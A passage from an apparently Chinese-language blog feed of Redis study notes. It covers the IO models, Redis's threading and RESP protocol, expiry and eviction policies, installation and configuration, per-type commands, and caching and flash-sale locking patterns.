- ①用户进程调用`aio_read`，创建信号回调函数

- ②内核等待数据就绪

- ③用户进程无需阻塞，可以做任何事情

阶段二：

- ①内核数据就绪

- ②内核数据拷贝到用户缓冲区

- ③拷贝完成，内核递交信号触发`aio_read`中的回调函数

- ④用户进程处理数据

> 可以看到，异步IO模型中，用户进程在两个阶段都是非阻塞状态。
> 但在大并发情况下, 内核积存的IO处理可能崩溃, 所以需要应用并发限流, 造成代码复杂度升高

#### 同步和异步判断

IO操作是同步还是异步，关键看数据在内核空间与用户空间的拷贝过程（数据读写的IO操作），也就是阶段二是同步还是异步：

![image-20220704134151079](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/6704416d0646e1cd9e768c5f4de15292-78bdf56.png)



### Redis网络模型

#### Redis到底是单线程还是多线程

- 如果仅仅是Redis的核心业务部分（命令处理），是单线程

- 如果是整个Redis，那么就是多线程

在Redis版本迭代过程中，在两个重要的时间节点上引入了多线程的支持：

- Redis v4.0：引入多线程异步处理一些耗时较旧的任务，例如异步删除命令`unlink`

- Redis v6.0：在核心网络模型中引入 多线程，进一步提高对于多核CPU的利用率

因此，对于Redis的核心网络模型，在Redis 6.0之前确实都是单线程。是利用`epoll`（Linux系统）这样的IO多路复用技术在事件循环中不断处理客户端情况。

#### 为什么Redis要选择单线程

- 抛开持久化不谈，Redis是**纯内存操作**，执行速度非常快，它的性能瓶颈是网络延迟而不是执行速度，因此多线程并不会带来巨大的性能提升。

- 多线程会导致过多的**上下文切换**，带来不必要的开销

- 引入多线程会面临**线程安全**问题，必然要引入线程锁这样的安全手段，实现复杂度增高，而且性能也会大打折扣

#### 事件API库 AE

Redis通过IO多路复用来提高网络性能，并且支持各种不同的多路复用实现，并且将这些实现进行封装， 提供了统一的高性能事件库API库 AE：

![image-20220704134802204](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/def9441aaa256e2878f18c703ab55d4b-55d43fe.png)

#### Redis单线程网络模型的流程

![image-20220704140419658](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/cc9cea3a079f897d41d30ef134c74d72-21b10b5.png)

![image-20220704140551856](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/dd6caa8813cfb591002117390451d4ac-0b82264.png)

**beforSleep代码** 

![image-20220704140907427](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f166984c504ca0572d90443ee6a5c827-b460529.png)

**readQueryFromClient代码** 

![image-20220704141124651](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f6a6f17690652f8db1e153dfdc1b1dfe-7773614.png)

#### Redis多线程应用

Redis 6.0版本中引入了多线程，目的是为了提高IO读写效率。因此在**解析客户端命令**、**写响应结果**时采用了多线程。核心的命令执行、IO多路复用模块依然是由主线程执行。

![image-20220704140655294](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/6fefd0eacd8763bd8f4879e3d06eaf84-77d5a84.png)



## 通信协议

### RESP协议

Redis是一个CS架构的软件，通信一般分两步（不包括pipeline和PubSub）：

- ①客户端（client）向服务端（server）发送一条命令

- ②服务端解析并执行命令，返回响应结果给客户端

因此客户端发送命令的格式、服务端响应结果的格式必须有一个规范，这个规范就是通信协议。



而在Redis中采用的是**RESP**（Redis Serialization Protocol）协议：

- Redis 1.2版本引入了RESP协议

- Redis 2.0版本中成为与Redis服务端通信的标准，称为RESP2

- Redis 6.0版本中，从RESP2升级到了RESP3协议，增加了更多数据类型并且支持6.0的新特性--客户端缓存

> 但目前，默认使用的依然是RESP2协议（简称RESP）。

#### RESP协议-数据类型

在RESP中，通过首字节的字符来区分不同数据类型，常用的数据类型包括5种：

- 单行字符串：首字节是 ‘`+`’ ，后面跟上单行字符串，以CRLF（ "`\r\n`" ）结尾。

  例如返回"`OK`"： "`+OK\r\n`"

- 错误（Errors）：首字节是 ‘`-`’ ，与单行字符串格式一样，只是字符串是异常信息

  例如："`-Error message\r\n`"

- 数值：首字节是 ‘`:`’ ，后面跟上数字格式的字符串，以CRLF结尾。

  例如："`:10\r\n`"

- 多行字符串：首字节是 ‘`$`’ ，表示二进制安全的字符串，最大支持512MB：

  - 如果大小为0，则代表空字符串："`$0\r\n\r\n`"
  - 如果大小为-1，则代表不存在："`$-1\r\n`"

  ![image-20220704154034088](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/406f421be12129c0c641452af565ff93-8ee99f5.png)

- 数组：首字节是 ‘`*`’，后面跟上数组元素个数，再跟上元素，元素数据类型不限:

  ![image-20220704154114414](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1abf7163730594c9ed1cbc279db9cd0a-c96cc7d.png)

#### 使用socket模拟Redis-cli

```

```

## 内存策略

Redis之所以性能强，最主要的原因就是基于内存存储。然而单节点的Redis其内存大小不宜过大，会影响**持久化**或**主从同步**性能。

我们可以通过修改配置文件来设置Redis的最大内存：

```properties
# 格式：
# maxmemory <bytes>
# 例如：
maxmemory 1gb
```

当内存使用达到上限时，就无法存储更多数据了。为了解决这个问题，Redis提供了一些策略实现内存回收：

- 内存过期策略

- 内存淘汰策略

### 过期策略

可以通过`expire`命令给Redis的key设置TTL（存活时间）：

![image-20220704154451906](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/624f3c606f0b85f72b702f4f1ce229cb-4a4dd96.png)

当key的TTL到期以后，再次访问`name`返回的是`nil`，说明这个key已经不存在了，对应的内存也得到释放。从而起到内存回收的目的。

#### 过期策略-DB结构

Redis本身是一个典型的key-value内存存储数据库，因此所有的key、value都保存在**Dict**结构中。不过在其database结构体中，有两个Dict：一个用来记录key-value(`dict`)；另一个用来记录key-TTL(`expires`)。

![image-20220704154725181](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/98af221b859a20a3d4d9b5f32367f03a-c9e7fa3.png)

redisDb内存图如下:

![image-20220704154902329](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f58bce0e122463aa227d2b62230e27c5-490fb09.png)

即Redis是通过key所在`redisDb`中`expires`包含`TTL`数据确定过期与否

#### 过期策略-过期删除

Redis的过期删除是通过结合使用惰性删除和周期删除完成的

- 惰性删除

  **惰性删除：**顾名思义并不是在TTL到期后就立刻删除，而是在访问一个key的时候，检查该key的存活时间，如果已经过期才执行删除。

  ![image-20220704155509355](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/11e43364a194fe41a5ef628d05ac861a-cf060ae.png)

  

- 周期删除.

  **周期删除：**顾名思义是通过一个定时任务，周期性的**抽样部分过期的key**，然后执行删除。执行周期有两种：

  - Redis服务初始化函数`initServer()`中设置定时任务`serverCron`，按照`server.hz`的频率来执行过期key清理，模式为**SLOW** 

    **SLOW**模式规则：

    ```
    ①执行频率受server.hz影响，默认为10，即每秒执行10次，每个执行周期100ms。
    ②执行清理耗时不超过一次执行周期的25%.默认slow模式耗时不超过25ms
    ③逐个遍历db，逐个遍历db中的bucket，抽取20个key判断是否过期
    ④如果没达到时间上限（25ms）并且全局过期key比例大于10%，再进行一次抽样，否则结束
    ```

  - Redis的每个事件循环前会调用`beforeSleep()`函数，执行过期key清理，模式为**FAST** 

    **FAST**模式规则（全局过期key比例小于10%不执行 ）：

    ```
    ①执行频率受beforeSleep()调用频率影响，但两次FAST模式间隔不低于2ms
    ②执行清理耗时不超过1ms
    ③逐个遍历db，逐个遍历db中的bucket，抽取20个key判断是否过期
    ④如果没达到时间上限（1ms）并且过期key比例大于10%，再进行一次抽样，否则结束
    ```

  ![image-20220704155829670](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3ed8f7407adec7fce41f6bf24aad69b0-3b8ea91.png)

### 淘汰策略

#### 内存淘汰

**内存淘汰**：就是当Redis内存使用达到设置的上限时，主动挑选**部分key**删除以释放更多内存的流程。Redis会在每次处理客户端命令的方法`processCommand()`中尝试做内存淘汰：

![image-20220704160141189](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/78786408b62d1b7cbccfb70feeda506b-8b1d24a.png)

#### 八种淘汰策略

![image-20220704160346602](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7ebc5a108459037109c7e1c66c4bc517-e433dae.png)

Redis支持8种不同策略来选择要删除的key：

- **noeviction**： 不淘汰任何key，但是内存满时不允许写入新数据，默认就是这种策略。

- **volatile-ttl**： 对设置了TTL的key，比较key的剩余TTL值，TTL越小越先被淘汰

- **allkeys-random**：对全体key ，随机进行淘汰。也就是直接从db->dict中随机挑选

- **volatile-random**：对设置了TTL的key ，随机进行淘汰。也就是从db->expires中随机挑选。

- **allkeys-lru**： 对全体key，基于LRU算法进行淘汰

- volatile-lru： 对设置了TTL的key，基于LRU算法进行淘汰

- **allkeys-lfu**： 对全体key，基于LFU算法进行淘汰

- **volatile-lfu**： 对设置了TTL的key，基于LFI算法进行淘汰

比较容易混淆的有两个：

```
- LRU（Least Recently Used），最少最近使用。用当前时间减去最后一次访问时间，这个值越大则淘汰优先级越高。
- LFU（Least Frequently Used），最少频率使用。会统计每个key的访问频率，值越小淘汰优先级越高。
```

#### LRU/LFU淘汰原理

Redis的数据都会被封装为`RedisObject`结构：

![image-20220704160630664](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/661f27ee502a096a363a9e920a95eb85-33207de.png)

**LFU**的访问次数之所以叫做**逻辑访问次数**，是因为并不是每次key被访问都计数，而是通过运算：

```
①生成0~1之间的随机数R
②计算 (旧次数 * lfu_log_factor + 1)，记录为P
③如果 R < P ，则计数器 + 1，且最大不超过255
④访问次数会随时间衰减，距离上一次访问时间每隔 lfu_decay_time 分钟，计数器 -1
```

![image-20220704160955402](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3a1a4d839f15b91febf4062aed8d9569-bd0f0f8.png)

#### 淘汰策略流程

![image-20220704161044411](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/460a024a7fa900faaf2ba2929ee4c2fc-6e1fa9f.png)]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis基于项目方案的结构功能解析</title>
    <url>/2022/05/22/Redis/Redis%E5%9F%BA%E4%BA%8E%E9%A1%B9%E7%9B%AE%E6%96%B9%E6%A1%88%E7%9A%84%E7%BB%93%E6%9E%84%E5%8A%9F%E8%83%BD%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[
## Redis结构功能解析

**Remote Dictionary Server** , 一款开源, 使用key-value存储的内存型数据结构服务器

### 简介

#### NoSQL

|          | SQL数据库                                                    | NoSQL数据库                                                  |
| -------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| 数据结构 | 结构化(Structured)                                           | 非结构化                                                     |
| 数据关联 | 关联(Relational)                                             | 无关联                                                       |
| 查询方式 | SQL查询                                                      | 非SQL                                                        |
| 事务特性 | ACID                                                         | BASE                                                         |
| 存储方式 | 磁盘                                                         | 内存                                                         |
| 扩展性   | 垂直                                                         | 水平                                                         |
| 使用场景 | 1) 数据结构固定<br />2) 业务对数据安全性、<br />一致性要求较高 | 1) 数据结构不固定<br />2) 对一致性、安全性要求不高<br />3) 对性能需求优先级高 |

#### 特征

- 键值(key-value)型, value支持多种**不同数据结构**, 功能丰富
- 工作线程为**单线程**, 每个命令具备原子性
- 低延迟、速度快(**基于内存**、I/O多路复用、良好编码)
- 支持数据持久化
- 支持主从集群、分片集群
- 支持多语言客户端

### 安装

#### apt安装

```shell
$ sudo apt install redis	# 安装
$ ps aux | grep redis		# 查看进程
$ sudo service redis-server stop	# 停止服务
$ sudo apt remove redis-server		# 移除安装
```

#### 编译安装

```shell
# 安装编译器
$ sudo apt install make gcc tcl
# 下载源码包
$ wget https://github.com/redis/redis/archive/refs/tags/6.2.6.tar.gz
# 解压并移动到指定目录
$ tar -zxvf 6.2.6.tar.gz
$ sudo mv redis-6.2.6 /usr/local/src/
$ cd /usr/local/src/redis-6.2.6
# 编译/测试
$ make && make install
$ make test
```

##### 配置

```shell
# 备份原有配置文件
$ cp /usr/local/src/redis-6.2.6/redis.conf /usr/local/src/redis-6.2.6/redis.conf.bak
# 修改配置文件
$ vim /usr/local/src/redis-6.2.6/redis.conf
```

```properties
# bind 127.0.0.1 -::1	# 修改为允许任意IP访问
bind 0.0.0.0 -::1

# daemonize no			# 修改为守护进程运行
daemonize yes

# requirepass foobared	# 修改为需要密码
requirepass xxxxxxxxx

# port 6379				# 修改默认端口
port 16379

# dir ./				# 修改工作目录
dir /usr/local/src/redis-6.2.6/work/

# databases 16			# 修改数据库数量

# maxmemory <bytes>		# 设置能够使用的最大内存

# logfile ""			# 指定日志文件名,不设置则标准输出,守护进程则废弃日志
logfile "/var/log/redis.log"

# 保护模式，关闭保护模式
protected-mode no

# 数据库数量，设置为1
databases 1
```

##### 运行

```shell
$ cd /usr/local/src/redis-6.2.6
# 指定配置文件运行
$ redis-server redis.conf
```

##### 关闭

```shell
$ redis-cli -a xxxxxxxxx -p 16379 shutdown
```

##### 配置systemctl

```shell
$ sudo vi /etc/systemd/system/redis.service
```

```properties
[Unit]
Description=redis-server
After=network.target

[Service]
Type=forking
ExecStart=/usr/local/bin/redis-server /usr/local/src/redis-6.2.6/redis.conf
PrivateTmp=true

[Install]
WantedBy=multi-user.target
```

```shell
$ sudo systemctl daemon-reload 	# 载入
$ sudo systemctl start redis			# 启动Redis服务
$ sudo systemctl stop redis			# 停止Redis服务
$ sudo systemctl restart redis	 	# 重启Redis服务
# 若报错: 
# Failed to start redis.service: Unit redis-server.service is masked.
$ sudo systemctl unmask redis-server.service 
```

##### 通过systemctl配置开机自启动

```shell
$ sudo systemctl enable redis
# 若报错: 
# Failed to enable unit: Refusing to operate on linked unit file redis.service

$ sudo systemctl is-enabled redis	# 检查是否已存在自启动文件
$ sudo systemctl disable redis		# 关闭原有自启动文件
$ sudo vi /etc/systemd/system/redis.service	# 重新写入文件
$ sudo systemctl enable redis		# 开启自启动
```

### 客户端

#### 命令行客户端

```shell
$ redis-cli [options] [command]
```

```
options:
	-h 192.168.253.138: 指定需要连接的redis节点的IP地址, 默认为127.0.0.1
	-p 16379: 指定需要连接的redis节点的端口, 默认为6379
	-a xxxxxx: 指定redis的访问密码
command:
	需要redis服务器执行的操作命令, 若不指定, 进入交互控制台
```

![image-20220617110016109](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c5b247ab9c91caade37188088776d78c-867cbcb.png)

> 可以在连接服务时不指定密码, 进入控制台后使用auth命令补充密码

#### 图形化桌面客户端

AnotherRedisDesktopManager

```
https://github.com/qishibo/AnotherRedisDesktopManager
```

### 数据结构

key-value数据库, key一般为String, value支持多种数据类型:

| 数据类型             | 示例                    |
| -------------------- | ----------------------- |
| 字符串 - String      | 'hello redis'           |
| 哈希 - Hash          | {name: 'jack', age: 21} |
| 列表 - List          | [A -> B -> C -> C]      |
| 集合 - Set           | {A, B, C}               |
| 有序集合 - SortedSet | {A: 1, B: 2, C: 3}      |
| GEO                  | {A: (120.3, 30.3)}      |
| BitMap               | 0110110101110101011     |
| HyperLogLog          | 0110110101110101011     |

```
数据结构对应命令可通过官方文档或客户端help @[数据类型]查看
 	- https://redis.io/commands/
	- help @string
```

#### 通用命令

```
文档: [Redis Generic Commands](https://redis.io/commands/?group=generic)
```

```
keys	查看符合模板pattern的所有key, 可能耗费较多系统资源
	支持的pattern模式
	- h?llo		匹配hello，hallo和hxllo
    - h*llo		匹配hllo和heeeello
    - h[ae]llo	匹配hello但hallo,不匹配hillo
    - h[^e]llo	匹配hallo, hbllo, ... 但不匹配hello
    - h[a-b]llo	匹配hallo和hbllo
del 	删除指定的键。如果键不存在，则忽略它. 返回值为已删除成功的键数量
copy	复制指定键内容到指定键
rename	重命名键名
exists 	判断指定key是否存在
expire 	为一个key设置有效期, 过期自动删除
ttl 	查看一个key的过期剩余时间, -1代表永不过期, -2代表key已不存在
```



#### String类型命令

> 字符串类型包括: string普通字符串, int整数类型, 可以自增减, float浮点类型, 可以自增减
>
> 最大空间不超过512m

```
set			添加或修改一个字符串类型的键值对
get			获取指定key对应的值
getdel 	 	获取key对应的值后删除key
mset  		批量设置键值对
mget 		获取多个key对应的值
incr 		为一个整型key对应的值自增1
incrby 	 	为一个整型key对应的值以指定步长自增
incrbyfloat 为一个浮点型key对应的值以指定步长自增
decr 		为一个整型key对应的值自减1
decrby 		为一个整型key对应的值以指定步长自减
setnx		仅在指定key不存在时才执行set操作, 相当于set key value nx
msetnx		仅在指定key不存在时才执行多个set操作
setex 		设置指定key-value并指定过期时间, 相当于set key value ex 10
psetex		使用微秒作为单位设置指定key-value并指定过期时间
setrange 	指定从偏移位置起, 覆写原有字符串
getrange 	指定起始-结束获取子字符串, 相当于 substr key 0 2
strlen 		获取key对应值的字符串长度
```



存储多项目, 多类型, 多用户时, 可以使用符号 `:` 格式设置键名

```
mset 
project1:module1:user1 v1 
project1:module2:user1 v2 
project1:module1:user2 v3  
project1:module2:user2 v1
```

![image-20220621004805666](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8682aa520d3fe6a4c5bc8c8caea2d109-0baefc4.png)

#### Hash类型命令

> 哈希类型, 也叫散列, 其value为一个无序字典, 可以将对象中每个字段独立存储, 单独做CURD

![image-20220620220446322](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e667b50359f06a70000759de780998bc-241e460.png)

```
hset		添加或修改hash类型key的值
hget		获取一个hash类型key的field对应的值
hmset		批量添加多个hash类型key的field对应的值
hmget		批量获取多个hash类型key的field对应的值
hgetall		获取一个hash类型key的所有field对应的值
hkeys		获取一个hash类型key中的所有fields
hvals		获取一个hash类型key中的所有fields对应的值
hincrby		使一个hash类型key的field对应的整型值自增并指定步长
hsetnx		仅在不存在时, 添加一个hash类型key的field对应的值
hlen		获取一个hash类型key中field的数量
hstrlen		获取一个hash类型key中field对应值的长度
```

#### List类型命令

> 可以看做双向链表, 即支持正向检索, 也支持反向检索
>
> 特征: 有序, 元素可重复, 插入/删除比较快, 查询速度一般
>
> 一般用于存储有序数据, 包括点赞列表, 评论列表等

```
lpush		向列表左侧插入一个或多个元素
lpop		移除并返回左侧第一个元素, 没有则返回nil
rpush		向列表右侧插入一个或多个元素
rpop		移除并返回右侧第一个元素, 没有则返回nil
lrange		返回一段索引范围内的所有元素
blpop		阻塞式移除并返回左侧第一个元素, 无元素则等待至超时
brpop		阻塞式移除并返回右侧第一个元素, 无元素则等待至超时
```

模拟栈(先进后出, 即入口出口在同一边) 

`rpush + rpop / lpush + lpop`

模拟队列(先进先出, 即入口出口在不同边)	

`rpush + lpop / lpush + rpop`

模拟阻塞队列(先进先出, 无则不出, 即入口出口在不同边, 出队时采用`blpop`或`brpop`)

`rpush + blpop / lpush + brpop`

#### Set类型命令

> 特征: 无序, 元素不可重复, 查找快, 支持交并差集操作
>
> 一般用于好友列表/ 共同关注/ 好友关系等

```
数据结构对应命令可通过官方文档或客户端help @[数据类型]查看
 	- https://redis.io/commands/
	- help @set
```

```
sadd key member 	向集合中添加一个或多个元素
srem key member		移除集合中的指定元素
scard key			返回集合中元素的个数
sismember key member	判断某个元素是否存在于集合中
smembers key		获取集合中的所有元素
sinter key1 key2	获取集合key1和key2的交集
sdiff key1 key2		获取集合key1与key2的差集
dunion key1 key2	获取集合key1与key2的并集
```

![image-20220621170701153](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8aa48b6c8279825ef834517f50dc6f2e-fc53c1f.png)

#### SortedSet类型命令

> 可排序集合, 集合中的每一个元素都带有一个score属性, 基于score实现元素排序
>
> 特性: 可排序 , 元素不可重复, 查询速度快
>
> 基于可排序性 , 一般用于排行榜功能

```
数据结构对应命令可通过官方文档或客户端help @[数据类型]查看
 	- https://redis.io/commands/
	- help @sorted_set
```

```
zadd key score member		添加一个或多个元素到有序集合, 如果已存在则更新其score值
zrem key member				删除有序集合的一个指定元素
zscore key member			获取有序集合中指定元素的score值
zcard key					获取有序集合中的元素个数
zcount key min max			统计score值在指定范围内的所有元素个数
zincrby key incr member		使有序集合中的指定元素自增, 步长为指定incr值
zrank key member			获取有序集合中指定元素的排名
zrevrank key member			获取有序集合中逆序排序后指定元素的排名
zrange key min max			按照score排序后, 获取指定排名范围内的元素
zrevrange key min max		按照score逆序排序后, 获取指定排名范围内的元素
zrangebyscore key min max	按照score排序后, 获取指定score范围内的元素
zrevrangebyscore key min max	按照score逆序排序后, 获取指定score范围内的元素
zinter|zunion|zdiff			求交|并|差集
```

score默认为正序, 正序排序为从小到大, 逆序为从大到小, 一般是在命令中加`rev`

## 使用Redis处理方案

- 短信登陆: Redis的共享session应用

- 商户查询缓存: 企业缓存使用技巧、缓存雪崩 穿透等问题

- 达人探店: 基于List的点赞列表, 基于SortedSet的点赞排行榜

- 优惠券秒杀: Redis计数器、Lua脚本Redis、分布式锁、三种消息队列

- 好友关注: 基于Set集合的关注、取关、共同关注、消息推送等功能

- 附近的商户: Redis的GeoHash应用

- 用户签到: BitMap数据统计功能

- UV统计: HyperLogLog统计功能

### 短信登陆

#### 基于session实现登陆流程

![image-20220622014130177](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/04a64730d992a27752f40ca6cf53e957-51a43c2.png)

**集群的session共享问题:**多台服务器不共享session存储空间, 当请求被切换到不同服务器时导致数据丢失

**替代方案特征:**数据共享, 内存存储, key-value结构

#### 基于Redis实现共享session登陆流程

![image-20220622124601044](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f9f034efaec6dd7c8015fc84cfa2a3df-1ab9138.png)

```
需要考虑问题: 
	选择合适的数据结构		String(json) 或 Hash(对象)
	选择合适的key		使用login:user:[手机号]存储验证码, 使用login:token:[随机数]存储用户信息
	选择合适的存储粒度		仅存储非敏感用户信息
```

### 商户缓存查询

#### 缓存

数据交换的缓冲区(cache), 是存贮数据的临时地址, 一般读写性能较高, 可以使用Redis充当应用层缓存

```
优势:
 - 减低后端负载
 - 提高读写效率, 降低响应时间
劣势:
 - 数据一致性成本
 - 代码维护成本
 - 运维成本(集群, 预热)
```

#### 添加Redis缓存

![image-20220622190047562](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/20ad7cc2e5939ab3060472ac015ef852-403e38b.png)

### 缓存更新策略

![image-20220622191427917](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/6a090a820f731c62f078f8f847934e5d-164280e.png)

```
业务场景:
 - 低一致性场景: 使用内存淘汰机制, 如店铺类型等几乎不变动的查询缓存
 - 高一致性场景: 主动更新为主, 并以超时剔除作为兜底, 如店铺详情查询缓存
```



一般由缓存调用者在更新数据库时更新缓存, 需要考虑如下问题:

- 删除缓存/更新缓存
  - 更新缓存可能造成多次无效写操作, 推荐使用删除缓存, 等查询时再更新缓存
- 保证缓存与数据库操作同时成功/失败
  - 单体系统可以使用事务保证原子性, 分布式考虑利用TCC等分布式事务方案
- 先操作缓存/先操作数据库
  - 推荐先操作数据库, 再删除缓存, 降低线程安全问题发生的概率

### 缓存穿透

客户端请求的数据在缓存中和数据库中都不存在, 导致每次请求都直接访问数据库, 缓存永远不生效

**解决方案:** 

#### **缓存空对象** 

将不存在的数据结果也缓存在Redis中, 赋值为`null` 

```
优点:
 - 实现简单, 维护方便
缺点:
 - 额外的内存消耗
 - 可能造成短期不一致(设置短TTL 或 新增数据时更新缓存)
```

![image-20220622200822389](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f115c6e4273792d5bfcc44b04f163f53-d685727.png)



#### **布隆过滤** 

在请求缓存时, 先通过布隆过滤器, 若数据库不存在该数据, 则拒绝请求. 若存在, 才会通过

> 布隆过滤器实际上是一个很长的二进制向量和一系列随机映射hash函数。将数据通过hash运算后映射到二进制向量位上, 当请求参数时, 同样运算后判断结果位是否都为1, 便可以判断是否存在该数据.
>
> Redis中支持 `setbit` 和 `getbit` 操作, 可以利用其实现布隆过滤操作

```
优点:
 - 内存占用少, 没有多余的key
缺点
 - 实现复杂
 - 存在误判可能(不存在数据精确判断, 存在数据可能误判)
```

![image-20220622195854529](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bcfddbbd31559e50e502c5da065091c0-915c9bb.png)

#### 其他预防方式

- 增强ID复杂度, 避免被猜测ID规律
- 做好数据的基础格式校验
- 加强用户权限校验
- 做好热点参数限流, 峰值限流

### 缓存雪崩

同一时段内大量缓存key失效或Redis服务宕机, 导致大量请求到达数据库, 带来数据库压力

#### 解决方案

```
- 给不同key的TTL添加随机值
- 利用Redis集群提高服务可用性(主-从, 哨兵)
- 给缓存业务添加降级限流策略(保护Redis/数据库服务)
- 给业务添加多级缓存
```

### 缓存击穿

也叫热点key问题, 就是一个被**高并发访问**并且**缓存重建业务较复杂**的key突然失效, 在这期间大量请求直接访问数据库, 带来大量服务压力

**解决方案**

#### 互斥锁

当发现无缓存数据时, 由当前进程`setnx`获取互斥锁, 然后进行缓存重建, 其余进程无法获取锁, 等待或返回空数据

```
优点:
 - 没有额外的内存消耗
 - 保证一致性
 - 实现简单
缺点:
 - 线程需要等待, 性能受影响
 - 可能有死锁风险
```

![image-20220622204332516](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/31a2c5e83c16a4a0fa22f83e3ef66057-ec06370.png)

使用互斥锁方式解决缓存击穿问题逻辑:

![image-20220622204714884](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ebd3eeaba133170a56989c71e4f376b6-e2f07d5.png)

#### 逻辑过期

缓存数据永不过期, 额外添加过期字段, 当用户请求发现该字段已过期时, 加锁并重建缓存, 其余进程无法获取锁, 返回该已过期数据

```
优点:
 - 线程无需等待, 性能较好
缺点:
 - 不保证一致性
 - 有额外的内存消耗
 - 实现复杂
```

![image-20220622204418325](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/41a2b07b4e90afa062dd2dce722544b7-91a4667.png)

使用逻辑过期方式解决缓存击穿问题逻辑:

![image-20220622205539234](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/93be2b13772b00f36fa68d824127b7cc-e91bd6a.png)

### 缓存封装工具

方法1: 将任意对象序列化为json并存储在String类型的key中, 并可以设置TTL过期时间

```

```

方法2: 将任意对象序列化为json并存储在String类型的key中, 并可以设置逻辑过期时间, 用于处理缓存击穿

```

```

方法3: 根据指定key查询缓存, 并解析为指定类型, 利用缓存空值null的方式解决缓存穿透问题

```

```

方法4: 根据指定key查询缓存, 并解析为指定类型,  利用逻辑过期解决缓存击穿问题

```

```

### 优惠券秒杀

#### 全局唯一ID

**Redis自增**

优惠券-用户订单表中, 不推荐使用自增ID, 因为规律性太明显, 且受表单数据量的限制(分表/分库)

```
全局ID生成器:
	在分布式系统下生成全局唯一ID的工具
需要具备: 唯一性, 高可用, 高性能, 递增性, 安全性
可以基于Redis的incr特性, 构建ID生成器
```

![image-20220622233011002](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/064df9baad2d7d4bd7fdd5e135a8010e-983a062.png)

```
组成部分: 
 - 符号位: 1bit, 永远为0
 - 时间戳: 31bit, 以秒为单位, 可以使用69年
 - 序列号: 32bit, 秒内计数器, 支持每秒产生2^32个不同的ID
注意: 
 - key可以使用: incr:[业务类型]:[本日日期(天)]来构建
 - 时间戳拼接时可以使用位左移实现 timestap << 32, 保证拼接结果为数字
 - 结果转为10进制
```

**其他方案**

```
- UUID 
- 雪花算法snowflake 
- 数据库自增 (特定表生成序列号部分)
```

#### 实现优惠券秒杀下单

![image-20220623000818493](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/fbcd511e5166a6d9ab22cf1f8f63f7b0-25021a8.png)

#### 超卖问题

![image-20220623001841084](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a941d8bf2be24a30a25910df426dd5c6-f360cb2.png)

超卖问题是典型的多线程安全问题, 常见解决方案就是加锁:

- 悲观锁:

  认为线程安全问题一定会发生, 因此在操作数据前先获取锁, 确保线程串行执行. 如mysql的`for update` 和 Redis的`setnx`

  实现方式简单粗暴, 但性能一般

- 乐观锁:

  认为线程安全问题不一定发生, 因此不加锁, 只是在更新数据时判断有没有其他线程对数据做了修改, 如果没有修改则认为是安全的, 才更新数据. 如果已经被其他线程修改, 则说明发生了线程安全问题, 尝试重试或异常

  优点是性能好, 但存在成功率较低的问题

**乐观锁实现方式**

**版本号法**: 添加版本号字段, 修改前与获取版本号对照

![image-20220623004315848](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9bd89d9e607fc15391c5a28c262a1f34-e5616f7.png)

**CAS** - Compare And Set: 对照原有数据, 没有修改才更新数据

![image-20220623004340797](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2ed9a95d612045c36c7f7648bd5400d1-55a65b4.png)

> 为解决失败率过高问题,  可以修改`stock = 1` 条件为 `stock > 0`

#### 一人一单

修改秒杀业务, 要求同一个优惠券, 一个用户只能下一单

![image-20220623005610699](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/6febe8acff4a74a6275846cbfd775725-60b3c8b.png)

> 需要为每个用户的行为加悲观锁, 以用户ID作为锁key, 否则查询订单结果不存在会被多个进程执行

**集群服务器中的并发安全问题** 

> 锁只能保证在本服务器中线程安全, 集群服务时会失效

![image-20220623021155653](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/508bcea8290cc87d862f6c8af6a68160-c6422f8.png)

#### 分布式锁

满足分布式系统或集群模式下多进程可见并且互斥的锁

实现方式:

|        |           MySQL           |                        Redis                        |            Zookeeper             |
| ------ | :-----------------------: | :-------------------------------------------------: | :------------------------------: |
| 互斥   | 利用mysql自身的互斥锁机制 |                  利用setnx互斥命令                  | 利用节点的唯一性和有序性实现互斥 |
